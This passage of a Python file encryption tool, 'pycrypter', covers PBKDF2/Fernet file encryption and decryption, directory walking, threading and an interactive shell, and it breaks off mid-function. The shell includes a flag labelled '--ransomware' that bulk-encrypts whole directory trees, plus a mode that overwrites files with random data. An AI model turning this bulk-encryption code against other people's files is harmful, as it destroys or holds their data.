# Required Modules
import platform
import atexit
import traceback

import os
import sys
import argparse

import getpass
import signal
import ctypes

import random
import string

# Threading Modules
import threading
import queue

# Other Modules
import time
import psutil
import shutil

# Customization Modules
import colorama
from colorama import Fore, Back, Style
from tqdm import tqdm

colorama.init()

# Tkinter GUI Module
import tkinter as tk

if platform.system() == "Windows":
	# pywin32 Modules
	import win32api
	import win32con
	import win32file
	from winnt import MAXDWORD
	import pywintypes

# Cryptography Modules
import base64
import hashlib
import cryptography

from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

from cryptography.fernet import Fernet

# pycrypter version
pycrypter_version = "1.0"

# Progress bar variables
bar_iteration = 0
bar_total = 0

# args variables
files_count = 0
files_finished = 0
files_exception_thrown = 0

# cleanup variables
accept_threads = True
cleanup_status = False

set_progress_bar = True
# semaphore
semaphore = threading.Semaphore(5)

# Threads created in worker function
threads = []

# Error lists
worker_errors = []
permission_errors = []

file_errors = []
dir_errors = []

interactive = {'init': False}
# misc
memory_max_allocated = 300 * 1024 * 1024  # 300MB
current_user = os.getlogin()

class DecryptionError(Exception):
	pass

class ArgumentError(Exception):
	pass

# kernel32 signal handler function | cleanup function
def cleanup_handler(signal=0, frame=None, silent=False, exit_reason=""):
	"""
	Create a cleanup handler to handle KeyboardInterrupt or start cleanup
	
	Parameters:
		signal (int): exit signal (optional, defaults to 0)
			The exit code used to exit the script.
		
		frame (frame object): not used (optional, defaults to None)
			Reserved for signal.signal() for Unix systems.
		
		silent (bool): print exit reason and code (optional, defaults to False)
			Defines whether to print {signal} and {exit_reason}
		
		exit_reason (str): exit reason (optional, defaults to "" [Empty string])
			Defines the exit reason.
			
	Returns:
		int: 0
	"""
	
	global bar_total

	global accept_threads
	accept_threads = False

	global cleanup_status
	cleanup_status = True

	for thread in threads:
		thread.join()

	if not silent:
		print(f"\n{Fore.LIGHTGREEN_EX}Exit reason: {exit_reason}\nExit code: {signal}{Style.RESET_ALL}\n", flush=True)

	if bar_total == 0 and not interactive['init']:
		py_pid = os.getpid()

		os.kill(py_pid, 9)
	return 0
	
# Register the handler
if platform.system() == "Windows":
	# kernel32 signal handler
	kernel32 = ctypes.windll.kernel32
	handler_type = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_ulong)

	handler_func = handler_type(lambda signal: cleanup_handler(signal=signal, exit_reason="KeyboardInterrupt"))
	kernel32.SetConsoleCtrlHandler(handler_func, True)

	signal.signal(signal.SIGINT, lambda signal, frame: None)
else:
	signal.signal(signal.SIGINT, lambda signal, frame: cleanup_handler(signal=signal, frame=frame, exit_reason="KeyboardInterrupt"))

# terminal progress bar
def progress_bar(iteration, total, prefix='', suffix='', decimals=1, length=50, fill='='):
	"""
	Call sys.stdout.write() to write a progress bar to the terminal

	Parameters:
		iteration (int): current iteration (required)
			The current iteration of the loop.
		
		total (int): total iterations (required)
			The total number of iterations for the loop
		
		prefix (str): prefix string (optional, defaults to "")
			A string that appears before the progress bar.
		
		suffix (str): suffix string (optional, defaults to "")
			A string that appears after the progress bar.
		
		decimals (int): positive number of decimals in percent complete (optional, defaults to 1)
			The number of decimal places to show in the percentage.
		
		length (int): character length of bar (optional, defaults to 50)
			The length of the progress bar.
		
		fill (str): bar fill character (optional, defaults to "=")
			The character used to fill the progress bar.

	Returns:
		None
		
		str:
		"CleanupInterrupt"
		"BarDisabled" - Returns if the bar was disabled (probably from pycrypter interactive)
		
	Example usage:
		progress_bar(10, 100, prefix='Progress:', suffix='Complete', decimals=1, length=50, fill='=')
		
		Output:
			Progress: |=====---------------------------------------------| 10.0% Complete
	"""

	if cleanup_status:
		return 'CleanupInterrupt'
	
	if not set_progress_bar:
		return 'BarDisabled'
	
	percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
	filled_length = int(length * iteration // total)
	bar = fill * filled_length + '-' * (length - filled_length)

	sys.stdout.write('\r%s |%s| %s%% %s' % (prefix, bar, percent, suffix))
	sys.stdout.flush()

# |==================================================| Threading functions |==================================================|

# thread worker
def worker(callback_function, *args, **kwargs):
	"""
	Call a function asynchronously using a worker function.
	If this function is called using "worker()", this will not asynchronously execute.
	
	Parameters:
		callback_function (func): callback function (required)
			The function to asynchronously.
			
		*args: arguments passed (optional)
			The arguments passed to the callback function.
			
		**kwargs: keyword arguments passed (optional)
			The keyword arguments passed to the callback function.
			
	Returns:
		None
		
		str: "CleanupInterrupt"
		
	Example usage:
		Bare call (main thread call):
			def my_func(arg1, arg2, kwarg1=""):
				print(f"Arg1: {arg1} | Arg2: {arg2} | kwarg1: {kwarg1}")
			
			worker(my_func, "Arg1", "Arg2", kwarg1="MyKwarg")
			
			Output: Arg1: "Arg1" | Arg2: "Arg2" | kwarg1: "MyKwarg"
		----------------------------------------------------------------
		Note: Bare calling worker() will not call the callback_function asynchronously
			
		thread_create call (async call):
			def my_func():
				print("Simulating work. . .")
				time.sleep(3)
				print("Work done!")
			
			thread_create(my_func)
			
			print("Main thread starting!")
			time.sleep(5)
			
			print("Main thread done!")
			
			Output:
				Simulating work. . .
				Main thread starting. . .
				[3 second pause]
				
				Work done!
				[2 second pause]
				Main thread done!
		------------------------------------------------------------------
		Use thread_create() for asynchronous calls
	"""
	
	global threads

	if not accept_threads:
		return 'CleanupInterrupt'
	
	try:
		current_thread = threading.current_thread()

		func_name = callback_function.__name__
		with semaphore:  # acquire and release the semaphore
			try:
				callback_function(*args, **kwargs)
			except Exception as err:
				err_name = type(err).__name__
				print(f"[worker, {func_name}] | Exception at thread {threading.get_ident()}, {err_name}, {err}")
				worker_errors.append(f"[worker, {func_name}] | Exception at thread {threading.get_ident()}, {err_name}, {err}")
			finally:
				threads.remove(current_thread)
	except Exception as err:
		err_name = type(err).__name__
		worker_errors.append(f"Exception occured at worker function, {err_name}, {err}")

# set max threads
def threads_max(max_threads=5):
	"""
	Set the amount of threads that can use the threading semaphore
		
	Parameters:
		max_threads (int): max threads (optional, defaults to 5)
			The amount of threads that can access the threading semaphore at once.
			
	Returns: 
		None
	
	Example usage:
		threads_max(7)
			This will allow 7 threads at once to execute.
			
		threads_max("String")
			This will raise a ValueError, stating that max_threads should be a valid integer.
			
		thread_max(26)
			This will print a warning in the console, saying that too many threads will slow down your computer.
	"""
	
	if not isinstance(max_threads, int):
		raise ValueError("max_threads must be a valid integer!")

	global semaphore
	semaphore = threading.Semaphore(max_threads)

	if semaphore._value > 15:
		print(Fore.YELLOW + 'Warning: Having too many threads can slow down your computer!' + Style.RESET_ALL)

# create a thread
def thread_create(callback, thread_name="", *args, **kwargs):
	"""
	Create a thread to call a function asynchronously.
	
	Parameters:
		callback (func): callback function (required)
			The function to asynchronously.
			
		thread_name (str): thread name (optional, defaults to "" [Empty string)
			The name for the thread created.
			
		*args: arguments passed (optional)
			The arguments passed to the callback function.
			
		**kwargs: keyword arguments passed (optional)
			The keyword arguments passed to the callback function.
			
	Returns:
		thread object
		
	Example usage: Refer to the docstring of the worker function. (worker.__doc__)
	"""

	global threads
	
	thread = threading.Thread(target=worker, args=(callback, *args), kwargs=kwargs, name=thread_name)
	
	thread.start()
	threads.append(thread)

	return thread

# |==================================================| Iteration functions |==================================================|

# iterate through a directory and optionally a subdirectory
def iterate_dir(directory, iterate_tree=True, skip_dirs=[]):
	"""
	Iterate through a directory while optionally iterating through the sub-directories
	
	Parameters:
		directory (str): directory to iterate (required)
			The directory passed to iterate through.
			
		iterate_tree (bool): iterate through sub-directories (optional, defaults to True)
			Defines whether the script iterates through sub-directories or not.
			
		skip_dirs (list): list of directories to skip (optional, defaults to []/empty list)
			Defines the sub-directories to exclude from the search.
			
		Returns:
			list: file_paths
				- The returned list will contain a relative/absolute path,
				- depending if it's ".\\" or "C:\\".
				
				- Refer to example usage below
			
			[if the argument isn't a directory]
				str: "NotADirectoryError"
				
		Example usage:
			Passing a non-boolean [True, False] to
			the iterate_tree argument will result in a ValueError:
			
			Traceback (most recent call last):
			  File "C:\MyPython\pycrypter.py", line 1, in <module>
				raise ValueError("iterate_tree must be a valid boolean!")
			ValueError: iterate_tree must be a valid boolean!
			
			[Passing True, False, 1, 0 is a valid boolean]
			
			=========================================================
			Passing a non-existent directory/a file will not raise
			an exception, but instead return a string value, signaling
			an error:
			
			Example 1:
				files = iterate_dir("C:\\MyFakeDirectory", iterate_tree=True, skip_dirs=[])
				
				print(files)
				
				[Output]
				NotADirectoryError
			
			Example 2:
				files = iterate_dir("C:\\MyPython\\myfile.txt", iterate_tree=True, skip_dirs=[])
				
				print(files)
				
				[Output]
				NotADirectoryError
			
			=========================================================
			A PermissionError exception will be caught, and added to
			an exception list:
						
			import win32api
			import win32con

			# Set the system attribute for the MyPython folder
			win32api.SetFileAttributes("C:\\MyPython\\", win32con.FILE_ATTRIBUTE_SYSTEM)

			permission_errors = []
			
			# Assume this code has two files, the script and "sys.txt"
			files = iterate_dir("C:\\MyPython\\", iterate_tree=True, skip_dirs=[])
			
			print(files)
			print(permission_errors)
			
			[Output]
			[]
			['iterate_dir | A PermissonError occured! Path: "C:\\MyPython"']
			
			---------------------------------------------------------
			How to call:
			
			files = iterate_dir(".", iterate_tree=True, skip_dirs=[])
			
			print(files)
			
			---------------------------------------------------------
			We can assume that the files in the current working directory
			is the current script file and a.txt, so this will be the output:
			
			['.\\pycrypter.py', '.\\a.txt']
			---------------------------------------------------------
			
			If you use "."/".." as the directory argument, any added to
			the list will be formatted as so:
			
			['.\\example.txt', '..\\myfile.txt']
			
			However, using the absolute path like so:
			iterate_dir("C:\\MyPython\\", iterate_tree=True, skip_dirs=[])
			
			Will return the absolute path, formatted like this:
			
			['C:\\MyPython\\a.txt']
	"""
	
	if iterate_tree not in [True, False]:
		raise ValueError("iterate_tree must be a valid boolean!")

	file_paths = []

	# Check argument if it's a directory
	if not os.path.isdir(directory):
		if os.path.isfile(directory):
			dir_errors.append(f"The specified path isn't a directory!")
		else:
			dir_errors.append(f"The specified directory doesn't exist!")

		return "NotADirectoryError"

	# Iterate through the directory, and catch PermissionErrors
	# If iterateTree is true, also loop through the sub-dirs
	try:
		for filename in os.listdir(directory):
			path = os.path.join(directory, filename)

			if path in skip_dirs:
				continue

			if os.path.isfile(path):
				file_paths.append(path)

			elif os.path.isdir(path) and iterate_tree:
				file_paths.extend(iterate_dir(path))
	except PermissionError as err:
		permission_errors.append(f"iterate_dir | A PermissonError occured! Path: \"{directory}\"")

	return file_paths

# check if a file exists
def find_file(file_path):
	try:
		if os.path.isfile(file_path):
			return True
		else:
			return False
	except PermissionError as err:
		permission_errors.append(f"find_file | A PermissonError occured! Path: \"{file_path}\"")

# check a directory if it exists
def find_dir(directory_path):
	try:
		if os.path.isdir(directory_path):
			return True
		else:
			return False
	except PermissionError as err:
		permission_errors.append(f"find_dir | A PermissonError occured! Path: \"{directory_path}\"")

# |==================================================| Cipher functions |==================================================|

# encryption function
def encrypt_file(input_file, password="", keep_copy=False, safedel_overwrite=False):
	"""
	Define a function to encrypt a file in chunks
	using the cryptography.Fernet module.
	
	Parameters:
		input_file (str): the input file (required)
			The file passed to encrypt.
		
		password (str): password to use (optional, defaults to ""/empty string)
			The password used to encrypt the file.
			
		keep_copy (bool): keep a copy of the decrypted file (optional, defaults to False)
			Defines whether the script should keep a copy of the decrypted file.
			
	Returns:
		int: 0 [Success]
		
		str:
			[Cleanup] "CleanupInterrupt"
			- This tells the script to stop executing
			
			[Error 1] "input_file == " + sys.argv[0] + " | Illegal operation"
			- This error tells the user that the input file is the current script file.
			
			[Error 2] "File doesn't exist/isn't a file | file_error"
			- This error tells the user that the file passed
			- isn't a file or the file doesn't exist.
			
	Exceptions:
		[Exception 1] raise ValueError("keep_copy must be a valid boolean")
		- This exception tells the user that the keep_copy argument
		- must be a valid boolean. [True, False, 1, 0]
		
		[Exception 2] raise MemoryError(
			f"The file \"{input_file}\" exceeds the maximum memory allowed to allocate. (Max: {max_mem} MB)")
		
		- This exception tells the user that the file passed is too large to process.
		- [The file must be below 300MB]
		
		[Exception 3] raise ValueError(f"The file \"{input_file}\" is a compiled binary file.")
		- This exception tells the user that they cannot pass a
		- compiled binary file as the file to encrypt.
		
	Example usage:
		Passing the script file will return Error 1
		
		return_value = encrypt_file("pycrypter.py", password="MyPass", keep_copy=False)
		print(return_value)
		
		[Output]
		input_file == pycrypter.py | Illegal operation
		
		=================================================================
		Passing a non-boolean to keep_copy will throw a ValueError [Exception 1]
		
		return_value = encrypt_file("pycrypter.py", password="MyPass", keep_copy="No")
		print(return_value)
		
		[Output]
		Traceback (most recent call last):
		  File "C:\\MyPython\\pycrypter.py", line 1, in <module>
			raise ValueError("keep_copy must be a valid boolean")
		ValueError: keep_copy must be a valid boolean
		
		=================================================================
		Passing a directory/non-existent file will return Error 2
		
		return_value_1 = encrypt_file("not_a_file", password="MyPass", keep_copy=False)
		return_value_2 = encrypt_file("someFakeFile.txt", password="MyPass", keep_copy=False)
		
		print(return_value_1)
		print(return_value_2)
		
		[Output]
		File doesn't exist/isn't a file | file_error
		File doesn't exist/isn't a file | file_error
		
		=================================================================
		Passing a file that exceeds memory_max_allocated will throw a MemoryError [Exception 2]
		
		return_value = encrypt_file("MyLargeFile.txt", password="MyPass", keep_copy=False)
		print(return_value)
		
		[Output]
		Traceback (most recent call last):
		  File "C:\MyPython\pycrypter_module.py", line 1, in <module>
			raise MemoryError(f"The file \"{input_file}\" exceeds the maximum memory allowed to allocate. (Max: {max_mem} MB)")
			
		MemoryError: The file "MyLargeFile.txt" exceeds the maximum memory allowed to allocate. (Max: 300.00 MB)
		
		=================================================================
		Passing a binary file will throw a ValueError [Exception 3]
		
		return_value = encrypt_file("MyProgram.exe", password="MyPass", keep_copy=False)
		print(return_value)
		
		[Output]
		Traceback (most recent call last):
		  File "C:\MyPython\pycrypter_module.py", line 1, in <module>
			raise ValueError(f"The file \"{input_file}\" is a compiled binary file.")
		
		ValueError: The file "MyProgram.exe" is a compiled binary file.
		
		------------------------------------------------------------------
		
		Basic usage:
			# We can assume that text.txt's contents is this:
			# This is my text in this .txt file
			
			return_value = encrypt_file("test.txt", password="MyPass", keep_copy=False)
			print(return_value) # This would print the integer "0"
			
			with open("test.txt", "r") as file:
				print(file.read())
				
			[Output]
			0
			Áî¼Ç6Ò–—0¡sIZéã†¸ëïÖa↕Ò¯;¶ª“QgAAAAABkRw0N50WP2VQ
			-q6i2jeCkVRExdZSvzChp1CFx_wKiPAvv7J6OJr4QFZIguTjp2P_ylVz31Z_kBye_TxjbV_5SAi3b4gSRpJMYkMXqSRFLslJyn1D6s_Hkc8EkgedWHOIqBEXc
			
			# The ciphertext above was separated into two lines to fit it in this docstring
	"""
	
	global cleanup_status
	global memory_max_allocated

	global bar_iteration
	bar_iteration += 1

	global files_finished
	files_finished += 1

	# Guard clauses
	if input_file == sys.argv[0]:
		return "input_file == " + sys.argv[0] + " | Illegal operation"

	if keep_copy not in [True, False]:
		raise ValueError("keep_copy must be a valid boolean")

	if cleanup_status:
		return "CleanupInterrupt"
	
	# Check argument if it's a file
	if not os.path.isfile(input_file):
		if os.path.isdir(input_file):
			file_errors.append(f"encrypt_file | The specified path \"{input_file}\" isn't a file!")
		else:
			file_errors.append(f"encrypt_file | The specified file \"{input_file}\" doesn't exist!")

		progress_bar(bar_iteration, bar_total, prefix=f'Total Progress:', suffix='Complete')
		print(file_errors)
		return "File doesn't exist/isn't a file | file_error"
	
	# file safeguard
	file_size = os.path.getsize(input_file)
	file_name, file_ext = os.path.splitext(input_file)
	
	if not safedel_overwrite:
		if file_size > memory_max_allocated:
			progress_bar(bar_iteration, bar_total, prefix=f'Total Progress:', suffix='Complete')
			max_mem = format(memory_max_allocated / (1024 * 1024))

			raise MemoryError(f"The file \"{input_file}\" exceeds the maximum memory allowed to allocate. (Max: {max_mem} MB)")
		elif file_ext in [".exe", ".dll", ".vhd", ".vdi", ".iso", ".vbox", ".vhdx", ".sys"]:
			progress_bar(bar_iteration, bar_total, prefix=f'Total Progress:', suffix='Complete')

			raise ValueError(f"The file \"{input_file}\" is a compiled binary file.")

	# Write encrypted contents
	temp_input_file = f"{input_file}.tempfile"

	# Encrypt the file in chunks
	with open(input_file, "rb") as original_file, open(temp_input_file, "ab") as encrypted_file:
		"""
		with open help:
			original_file: The original encrypted file [input_file]
			encrypted_file: The file to write encrypted contents into [temp_input_file]
		"""

		# Derive key from password and salt
		salt = os.urandom(32)

		kdf = PBKDF2HMAC(
			algorithm=hashes.SHA256(),
			length=32,
			salt=salt,
			iterations=100000
		)

		if isinstance(password, bytes):
			key = kdf.derive(password)
		elif isinstance(password, str):
			key = kdf.derive(password.encode())
		
		fernet_key = base64.urlsafe_b64encode(key)
		
		if safedel_overwrite:
			encrypted_file.close()
			os.remove(temp_input_file)
		else:
			# Write the salt and encrypt the file
			encrypted_file.write(salt)
		
		if safedel_overwrite:
			original_file.close()
			
			with open(input_file, "ab") as original_file:
				file_size = os.path.getsize(input_file)
				chunk = 50 * 1024 * 1024  # Read 1MB at a time
				
				original_file.truncate(0)
				original_file.write(salt)
				
				file_size += 32
				
				while True:
					if not file_size:
						break
					
					if file_size > chunk:
						chunk = 50 * 1024 * 1024
						file_size -= chunk
					else:
						chunk = file_size
						file_size = 0
					
					chunk_data = os.urandom(chunk)
					
					chunk_encrypted = Fernet(fernet_key).encrypt(chunk_data)
					
					original_file.write(chunk_encrypted)
					original_file.flush()
		else:
			while True:
				chunk = original_file.read(50 * 1024 * 1024)  # Read 1MB at a time

				if not chunk:
					break

				chunk_encrypted = Fernet(fernet_key).encrypt(chunk)
				encrypted_file.write(chunk_encrypted)

	# Erase/keep the temp file
	if keep_copy:
		file_name_and_ext, file_ext = os.path.splitext(temp_input_file)
		
		file_name, file_ext = os.path.splitext(file_name_and_ext)
		os.rename(input_file, f"{file_name}_decrypted_copy{file_ext}")
		
		os.rename(temp_input_file, input_file)
	else:
		if not interactive['init']:
			os.remove(input_file)
			os.rename(temp_input_file, input_file)

	progress_bar(bar_iteration, bar_total, prefix=f'Total Progress:', suffix='Complete')
	
	interactive[f"{input_file} | parse_complete"] = True
	return 0

# decryption function
def decrypt_file(input_file, password="", keep_copy=False):
	"""
	Define a function to decrypt a file in chunks
	using the cryptography.Fernet module.
	
	Parameters:
		input_file (str): the input file (required)
			The file passed to decrypt.
		
		password (str): password to use (optional, defaults to ""/empty string)
			The password used to decrypt the file.
			
		keep_copy (bool): keep a copy of the decrypted file (optional, defaults to False)
			Defines whether the script should keep a copy of the encrypted file.
			
	Returns:
		int: 0 [Success]
		
		str:
			[Cleanup] "CleanupInterrupt"
			- This tells the script to stop executing
			
			[Error 1] "input_file == " + sys.argv[0] + " | Illegal operation"
			- This error tells the user that the input file is the current script file.
			
			[Error 2] "File doesn't exist/isn't a file | file_error"
			- This error tells the user that the file passed
			- isn't a file or the file doesn't exist.
			
	Exceptions:
		[Exception 1] raise ValueError("keep_copy must be a valid boolean")
		- This exception tells the user that the keep_copy argument
		- must be a valid boolean. [True, False, 1, 0]
		
		[Exception 2] raise MemoryError(
			f"The file \"{input_file}\" exceeds the maximum memory allowed to allocate. (Max: {max_mem} MB)")
		
		- This exception tells the user that the file passed is too large to process.
		- [The file must be below 300MB]
		
		[Exception 3] raise ValueError(f"The file \"{input_file}\" is a compiled binary file.")
		- This exception tells the user that they cannot pass a
		- compiled binary file as the file to decrypt.
		
		[Exception 4] raise DecryptionError(f"The key \"{password}\" is invalid.")
		- This exception indicates that the password passed is invalid.
		- Note: This exception is a custom defined exception
		
	Example usage:
		Passing the script file will return Error 1
		
		return_value = decrypt_file("pycrypter.py", password="MyPass", keep_copy=False)
		print(return_value)
		
		[Output]
		input_file == pycrypter.py | Illegal operation
		
		=================================================================
		Passing a non-boolean to keep_copy will throw a ValueError [Exception 1]
		
		return_value = decrypt_file("pycrypter.py", password="MyPass", keep_copy="No")
		print(return_value)
		
		[Output]
		Traceback (most recent call last):
		  File "C:\\MyPython\\pycrypter.py", line 1, in <module>
			raise ValueError("keep_copy must be a valid boolean")
		ValueError: keep_copy must be a valid boolean
		
		=================================================================
		Passing a directory/non-existent file will return Error 2
		
		return_value_1 = decrypt_file("not_a_file", password="MyPass", keep_copy=False)
		return_value_2 = decrypt_file("someFakeFile.txt", password="MyPass", keep_copy=False)
		
		print(return_value_1)
		print(return_value_2)
		
		[Output]
		File doesn't exist/isn't a file | file_error
		File doesn't exist/isn't a file | file_error
		
		=================================================================
		Passing a file that exceeds memory_max_allocated will throw a MemoryError [Exception 2]
		
		return_value = decrypt_file("MyLargeFile.txt", password="MyPass", keep_copy=False)
		print(return_value)
		
		[Output]
		Traceback (most recent call last):
		  File "C:\MyPython\pycrypter_module.py", line 1, in <module>
			raise MemoryError(f"The file \"{input_file}\" exceeds the maximum memory allowed to allocate. (Max: {max_mem} MB)")
			
		MemoryError: The file "MyLargeFile.txt" exceeds the maximum memory allowed to allocate. (Max: 300.00 MB)
		
		=================================================================
		Passing a binary file will throw a ValueError [Exception 3]
		
		return_value = decrypt_file("MyProgram.exe", password="MyPass", keep_copy=False)
		print(return_value)
		
		[Output]
		Traceback (most recent call last):
		  File "C:\MyPython\pycrypter_module.py", line 1, in <module>
			raise ValueError(f"The file \"{input_file}\" is a compiled binary file.")
		
		ValueError: The file "MyProgram.exe" is a compiled binary file.
		
		=================================================================
		Passing the wrong password will throw a custom defined DecryptionError [Exception 4]
		
		return_value = decrypt_file("text.txt", password="WrongPassword", keep_copy=False)
		print(return_value)
		
		[Output]
		Traceback (most recent call last):
		  File "C:\MyPython\pycrypter_module.py", line 1, in <module>
			raise DecryptionError(f"The key \"{password}\" is invalid.")
		
		DecryptionError: The key "WrongPassword" is invalid.
		------------------------------------------------------------------
		
		Basic usage:
			# We can assume that text.txt's contents is this ciphertext:
			# [Had to split it into two lines for this documentation]
			
			# Áî¼Ç6Ò–—0¡sIZéã†¸ëïÖa↕Ò¯;¶ª“QgAAAAABkRw0N50WP2VQ
			# -q6i2jeCkVRExdZSvzChp1CFx_wKiPAvv7J6OJr4QFZIguTjp2P_ylVz31Z_kBye_TxjbV_5SAi3b4gSRpJMYkMXqSRFLslJyn1D6s_Hkc8EkgedWHOIqBEXc
			
			return_value = decrypt_file("test.txt", password="MyPass", keep_copy=False)
			print(return_value) # This would print the integer "0"
			
			with open("test.txt", "r") as file:
				print(file.read())
				
			[Output]
			0
			This is my text in this .txt file
	"""

	global cleanup_status
	global memory_max_allocated
	
	global bar_iteration
	bar_iteration += 1

	global files_finished
	files_finished += 1

	# Guard clauses
	if input_file == sys.argv[0]:
		return "input_file == " + sys.argv[0] + " | Illegal operation"

	if keep_copy not in [1, 0]:
		raise ValueError("keep_copy must be a valid boolean!")
		return "keep_copy must be a valid boolean | ValueError"

	if cleanup_status:
		return "CleanupInterrupt"

	# Check argument if it's a file
	if not os.path.isfile(input_file):
		if os.path.isdir(input_file):
			file_errors.append(f"encrypt_file | The specified path \"{input_file}\" isn't a file!")
		else:
			file_errors.append(f"encrypt_file | The specified file \"{input_file}\" doesn't exist!")

		progress_bar(bar_iteration, bar_total, prefix=f'Total Progress:', suffix='Complete')
		return "File doesn't exist/isn't a file | file_error"

	# Cipher part
	file_size = os.path.getsize(input_file)
	file_name, file_ext = os.path.splitext(input_file)

	if file_size > memory_max_allocated:
		progress_bar(bar_iteration, bar_total, prefix=f'Total Progress:', suffix='Complete')
		max_mem = format(memory_max_allocated / (1024 * 1024))

		raise MemoryError(f"The file \"{input_file}\" exceeds the maximum memory allowed to allocate. (Max: {max_mem} MB)")
	elif file_ext in [".exe", ".dll", ".vhd", ".vdi", ".iso", ".vbox", ".vhdx", ".sys"]:
		progress_bar(bar_iteration, bar_total, prefix=f'Total Progress:', suffix='Complete')

		raise ValueError(f"The file \"{input_file}\" is a compiled binary file.")

	# Write encrypted contents
	temp_input_file = f"{input_file}.tempfile"

	# Decrypt the file in chunks
	with open(input_file, "rb") as original_file, open(temp_input_file, "ab") as decrypted_file:
		"""
		with open help:
			original_file: The original encrypted file [input_file]
			decrypted_file: The file to write decrypted contents into [temp_input_file]
		"""

		decrypted_file.write(b"")
		salt = original_file.read(32)

		# Derive key from password and salt
		kdf = PBKDF2HMAC(
			algorithm=hashes.SHA256(),
			length=32,
			salt=salt,
			iterations=100000
		)
		
		if isinstance(password, bytes):
			key = kdf.derive(password)
		elif isinstance(password, str):
			key = kdf.derive(password.encode())
		
		fernet_key = base64.urlsafe_b64encode(key)

		# Check if the key is correct
		dummy_data = original_file.read(50 * 1024 * 1024)

		try:
			dummy_decrypted = Fernet(fernet_key).decrypt(dummy_data)
		except cryptography.fernet.InvalidToken:
			dummy_data = None
			dummy_decrypted = None

			original_file.close()
			decrypted_file.close()

			os.remove(temp_input_file)

			progress_bar(bar_iteration, bar_total, prefix=f'Total Progress:', suffix='Complete')
			raise DecryptionError(f"The key \"{password}\" is invalid.")

		# Write decrypted contents
		original_file.seek(32)  # sets the file pointer to 32 bytes to prevent reading the salt

		while True:
			chunk = original_file.read(50 * 1024 * 1024)  # Read 50MB at a time

			if not chunk:
				break

			chunk_decrypted = Fernet(fernet_key).decrypt(chunk)
			decrypted_file.write(chunk_decrypted)

	# Erase/keep the file
	if keep_copy:
		file_name_and_ext, file_ext = os.path.splitext(temp_input_file)
		
		file_name, file_ext = os.path.splitext(file_name_and_ext)
		os.rename(input_file, f"{file_name}_encrypted_copy{file_ext}")
		
		os.rename(temp_input_file, input_file)
	else:
		os.remove(input_file)
		os.rename(temp_input_file, input_file)

	progress_bar(bar_iteration, bar_total, prefix=f'Total Progress:', suffix='Complete')
	
	interactive[f"{input_file} | parse_complete"] = True
	return 0

# Final debugging information, executed after everything
def debug_info(interactive_call=False):
	global bar_iteration
	
	if bar_iteration == 0:
		return "not_in_progress"

	# Worker errors
	print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
	print(f"{Fore.LIGHTGREEN_EX}Worker errors:{Style.RESET_ALL}\n")

	for err in worker_errors:
		print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
		print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

	# Permission errors
	print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
	print(f"{Fore.LIGHTGREEN_EX}Permission errors:{Style.RESET_ALL}\n")

	for err in permission_errors:
		print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
		print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

	# File and directory errors
	print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
	print(f"{Fore.LIGHTGREEN_EX}File and directory errors:{Style.RESET_ALL}\n")

	for err in file_errors:
		print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
		print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

	for err in dir_errors:
		print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
		print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

	print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")

def pycrypter_interactive():
	interactive['init'] = True
	
	global files_count
	global files_finished
	global files_exception_thrown

	global bar_total
	global current_user
	global set_progress_bar
	
	def tokenize(string):
		tokens = []
		start = 0
		in_quotes = False

		for iteration, char in enumerate(string):
			if char == '"' or char == "'":
				in_quotes = not in_quotes
			elif char == ' ' and not in_quotes:
				token = string[start:iteration]
				
				if in_quotes and token.startswith('"') and token.endswith('"'):
					token = token[1:-1]  # remove quotes
				tokens.append(token)
				start = iteration + 1

		token = string[start:]
		if in_quotes and token.startswith('"') and token.endswith('"'):
			token = token[1:-1]  # remove quotes
		tokens.append(token)

		for iteration, token in enumerate(tokens):
			if (token[0] == '"' and token[len(token) - 1] == '"'):
				tokens[iteration] = tokens[iteration][1:-1]
			
			if token[0] == "'" and token[len(token) - 1] == "'":
				tokens[iteration] = tokens[iteration][1:-1]
		
		return tokens
	
	main = Main()
	
	while True:
		if cleanup_status:
			break
		
		time.sleep(0.01)
		try:
			command = input("pycrypter> ")
		except EOFError:
			cleanup_handler(signal=0, silent=True, exit_reason="EOFCharacterExit")
			break
		
		if command == "exit":
			cleanup_handler(signal=0, silent=True, exit_reason="SystemExit")
			break
		
		if "encrypt " in command.lower():
			encryption_arguments = command.replace("encrypt ", "").lower()
			keep_copy = False
			
			if "-c " in encryption_arguments or "--keep-copy " in encryption_arguments:
				keep_copy = True
				
				args1 = encryption_arguments.replace("-c ", '')
				encryption_arguments = args1.replace("--keep_copy ", '')
				
			if "-rw" in encryption_arguments or "--ransomware" in encryption_arguments:
				args1 = encryption_arguments.replace("-rw", "")
				encryption_arguments = args1.replace("--ransomware", "")
				
				dir_list = [
					f"C:\\MyPython\\hmm"
				]
				
				skip_dirs = [
					f"C:\\Users\\{current_user}\\AppData"
				]
				
				password = getpass.getpass("Enter a password: ")
				
				sys.stdout.write("|-------------------------------------------------------------|\n")
				sys.stdout.flush()
				
				main.ransomware(
					dir_list,
					skip_directories=skip_dirs,
					verbose=True,
					password=password,
					keep_copy=keep_copy,
					cipher_method="encrypt"
				)
				
				debug_info()
				continue
				
			if "-f " in encryption_arguments or "--file " in encryption_arguments:
				args1 = encryption_arguments.replace("-f ", "")
				argument_files = args1.replace("--file ", "")
				
				files = tokenize(argument_files)
				
				password = getpass.getpass("Enter a password: ")
				
				sys.stdout.write("|-------------------------------------------------------------|\n")
				sys.stdout.flush()
				
				if files:
					main.cipher_file(
						files,
						verbose=True,
						password=password,
						keep_copy=keep_copy,
						cipher_method="encrypt"
					)
			if "-dr " in encryption_arguments or "--directory " in encryption_arguments:
